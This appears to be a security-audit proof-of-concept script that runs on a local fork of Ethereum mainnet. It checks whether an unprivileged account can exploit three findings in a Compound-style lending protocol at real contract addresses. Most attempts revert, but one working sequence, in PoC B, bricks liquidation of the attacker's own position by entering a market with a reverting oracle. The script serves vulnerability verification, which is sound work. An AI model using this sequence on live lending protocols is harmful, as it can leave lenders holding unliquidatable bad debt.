import urllib.request, json
from keccak import sel
RPC = "http://127.0.0.1:8545"
def rpc(method, params):
    body = json.dumps({"jsonrpc":"2.0","id":1,"method":method,"params":params}).encode()
    req = urllib.request.Request(RPC, data=body, headers={"Content-Type":"application/json"})
    return json.load(urllib.request.urlopen(req, timeout=90))
def addr32(a): return a[2:].lower().rjust(64,"0")
def u32(n): return hex(n)[2:].rjust(64,"0")
def _hex(d): return d if d.startswith("0x") else "0x"+d
def call(to, data, frm=None):
    p={"to":to,"data":_hex(data)}
    if frm: p["from"]=frm
    r=rpc("eth_call",[p,"latest"])
    if "error" in r: return None, r["error"].get("message","")
    return r["result"], None
def send(to, data, frm, value=0, gas=8000000):
    p={"to":to,"data":_hex(data),"from":frm,"gas":hex(gas)}
    if value: p["value"]=hex(value)
    r=rpc("eth_sendTransaction",[p])
    if "error" in r: return "0x0", r["error"].get("message","")
    rc=rpc("eth_getTransactionReceipt",[r["result"]])
    return rc.get("result",{}).get("status"), None
def outcome(st,err):
    if err: return f"REVERT: {err[:75]}"
    if st=="0x0": return "REVERT (status 0x0)"
    if st=="0x1": return "SUCCESS"
    return f"status={st}"
def revert_reason(to,data,frm):
    _,err=call(to,data,frm); return err or "(no revert - ALLOWED)"
def impersonate(a):
    rpc("evm_addAccount",[a,"pw"]); rpc("personal_unlockAccount",[a,"pw",0]); rpc("evm_setAccountBalance",[a,hex(10**18)])
def w1(res): return int(res[2:66],16) if res and len(res)>=66 else None

COMP="0xAB1c342C7bf5Ec5F02ADEA1c2270670bCa144CbB"; ORACLE="0xbd6f5add9b7a6eb151933cb4efd50be4eca71451"
WETH="0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2"; iWETH="0x41c84c0e2ee0b740cf0d31f63f3b6f627dc6b393"
iLINK="0xe7bff2da8a2f619c2586fb83938fa56ce803aa16"; iUSDC="0x76eb2fe28b36b3ee97f3adae0c69606eedb2a37c"
iMIM="0x9e8e207083ffd5bdc3d99a1f32d1e6250869c1a9"
accts=rpc("eth_accounts",[])["result"]; attacker=accts[0]; liquidator=accts[1]
print(f"fork block: {int(rpc('eth_blockNumber',[])['result'],16)}   ATTACKER={attacker} (unprivileged EOA)\n")

print("="*74)
print("PoC A — FINDING 3 (P2P credit line): unprivileged reach?")
print("="*74)
print("A1 attacker._setCreditLimit(attacker,iUSDC,1e30) ->",
      revert_reason(COMP, sel("_setCreditLimit(address,address,uint256)")+addr32(attacker)+addr32(iUSDC)+u32(10**30), attacker))
print("A2 attacker.iLINK.borrow(1 LINK) with $0 collateral ->",
      revert_reason(iLINK, sel("borrow(uint256)")+u32(10**18), attacker))
print(">> Finding 3 gated to admin/creditLimitManager; unprivileged uncollateralized borrow impossible. AT RISK (unprivileged) = $0\n")

print("="*74)
print("PoC C — FINDING 1 (single-source oracle): unprivileged price move / over-borrow?")
print("="*74)
print("C1 attacker.oracle._setAggregators([],[],[]) ->",
      revert_reason(ORACLE, sel("_setAggregators(address[],address[],address[])")+u32(0x60)+u32(0x80)+u32(0xa0)+u32(0)+u32(0)+u32(0), attacker))
# supply 100 WETH, measure exact borrowing power, then attempt to exceed it
rpc("evm_setAccountBalance",[attacker,hex(500*10**18)])
send(WETH, sel("deposit()"), attacker, value=100*10**18)
send(WETH, sel("approve(address,uint256)")+addr32(iWETH)+u32(2**256-1), attacker)
print("   iWETH.mint(100 WETH):", outcome(*send(iWETH, sel("mint(uint256)")+u32(100*10**18), attacker)))
print("   enterMarkets([iWETH]):", outcome(*send(COMP, sel("enterMarkets(address[])")+u32(0x20)+u32(1)+addr32(iWETH), attacker)))
res,_=call(COMP, sel("getAccountLiquidity(address)")+addr32(attacker), attacker)
liq=int(res[66:130],16)/1e18 if res else 0
print(f"   borrowing power from 100 WETH @ CF 0.85 = ${liq:,.0f}")
linkcash,_=call(iLINK, sel("getCash()")); print(f"   iLINK cash available to actually borrow = {w1(linkcash)/1e18:.1f} LINK")
print("C3 attacker.iLINK.borrow(100000 LINK) >> collateral ->",
      revert_reason(iLINK, sel("borrow(uint256)")+u32(100000*10**18), attacker))
print(">> No unprivileged price move; borrow strictly bounded by collateral*CF. AT RISK (unprivileged, today) = $0\n")

print("="*74)
print("PoC B — FINDING 2 (oracle revert bricks liquidity): unprivileged self-poison?")
print("="*74)
print("   attacker borrows 500 LINK against WETH:", outcome(*send(iLINK, sel("borrow(uint256)")+u32(500*10**18), attacker)))
res,_=call(COMP, sel("getAccountLiquidity(address)")+addr32(attacker), attacker)
print(f"   BEFORE poison: getAccountLiquidity -> {'OK (liq=$'+format(int(res[66:130],16)/1e18,',.0f')+')' if res else 'REVERT'}")
holders=json.load(open("data/poison_accounts.json"))["iMIM"]["holders"]
donor=None
for hd in holders:
    b,_=call(iMIM, sel("balanceOf(address)")+addr32(hd))
    if b and w1(b)>100000: donor=hd; donorbal=w1(b); break
print(f"   iMIM cToken donor (models OTC purchase of cTokens): {donor} ({donorbal/1e8:.4f} cMIM)")
impersonate(donor)
print("   donor.transfer(attacker, half):", outcome(*send(iMIM, sel("transfer(address,uint256)")+addr32(attacker)+u32(donorbal//2), donor)))
ab,_=call(iMIM, sel("balanceOf(address)")+addr32(attacker)); print(f"   attacker iMIM cToken balance = {(w1(ab) or 0)/1e8:.4f}")
print("   attacker.enterMarkets([iMIM]):", outcome(*send(COMP, sel("enterMarkets(address[])")+u32(0x20)+u32(1)+addr32(iMIM), attacker)))
res,err=call(COMP, sel("getAccountLiquidity(address)")+addr32(attacker), attacker)
print(f"   AFTER poison: getAccountLiquidity -> {'STILL OK (poison FAILED)' if res else 'REVERT: '+err}")
print("   third-party liquidator.liquidateBorrow(attacker,1 LINK,seize iWETH) ->",
      revert_reason(iLINK, sel("liquidateBorrow(address,uint256,address)")+addr32(attacker)+u32(10**18)+addr32(iWETH), liquidator))
print(">> Unprivileged attacker CAN self-poison -> liquidation bricked. But immediate")
print("   extractable profit = $0: realizing bad debt needs collateral to fall below debt,")
print("   which requires an EXTERNAL price move the attacker cannot cause. Structural risk only.")
